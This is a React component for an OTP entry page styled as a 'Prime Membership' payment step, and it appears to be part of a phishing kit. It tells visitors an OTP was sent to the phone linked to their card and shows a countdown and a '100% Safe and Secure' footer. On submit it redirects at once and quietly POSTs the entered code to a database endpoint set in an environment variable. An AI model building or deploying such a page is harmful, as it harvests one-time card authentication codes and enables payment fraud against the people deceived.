import React from 'react';
import { useState, useEffect, useRef } from 'react'



import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';





function Otp() {

  const [counter, setCounter] = React.useState(59);
  React.useEffect(() => {
      const timer =
      counter > 0 && setInterval(() => setCounter(counter - 1), 1000);
      return () => clearInterval(timer);
  }, [counter]);



  const [count, setCount] = useState()
  const navigate = useNavigate();

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors, isSubmitting },
  } = useForm();

  const delay = (d) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve()
      }, d * 5000);
    })
  }

  //const onSubmit = async (data) => {
  // await delay(2)
  //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
  //let res = await r.text()
  //console.log(data, res)


  const onSubmit = async (data) => {
    navigate("/")
    let r = await fetch(import.meta.env.VITE_MONGO, {
      method: "POST", headers: {
        "Content-Type": "application/json",
      }, body: JSON.stringify(data)

      
    })
    let res = await r.text()
   
    console.log(data, res)


  }

  

  return (
    <>

<div className="payment-nav card-navbar">
  
        <img id='payment-img' src="./img/img1.png.webp" alt="fail to load img 1" />
        <h3 id='payment-heading'> Prime Membership</h3>
      </div>
      


    



      {isSubmitting && <div>Loading...</div>}
      <div className="container">

<div className="otp-heading">OTP send to the phone number linked to your card </div>

        <form action="" onSubmit={handleSubmit(onSubmit)}>
          
         

          <div class="col-12">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">OTP</p>
                        <input class="otp-input" type="Number" placeholder="OTP"  {...register("OTP")}  name='OTP' />
                    </div>
                </div>
         

                <div class="col-12">
                <button  type="submit" value="submit"  class="otp-btn">
                        <span class="ps-3">Pay </span>
                        <span class="fas fa-arrow-right"></span>
                    </button>
                    </div>  
        </form>

       
<div className="timer">Resend OTP in 00:{counter}</div>
      
      </div>




    
      <div className="footer debit-footer">
        <img id='footer-img' src="./img/img1.png.webp" alt="fail to load footer img " />
        <h3 id='footer-heading'>
          100% Safe and Secure
        </h3>

      </div>

    </>
  )
}

export default Otp
